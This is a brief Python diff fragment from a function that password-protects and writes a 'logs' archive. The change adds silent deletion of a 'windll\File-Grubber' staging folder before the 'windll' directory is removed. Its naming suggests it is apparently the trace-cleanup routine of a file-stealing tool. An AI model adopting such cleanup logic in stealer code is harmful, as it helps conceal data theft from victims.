@@ -40,6 +40,10 @@ def makemeZip(name,password,np):
 			logs.setpassword(pwd)
 			logs.write(r'cache.zip')
 		os.remove("cache.zip")
+		try:
+			shutil.rmtree(rf'{path}\windll\File-Grubber', ignore_errors=True)
+		except:
+			pass
 		shutil.rmtree(rf'{path}\windll', ignore_errors=True)
 		np.append(name)
 		np.append(password)
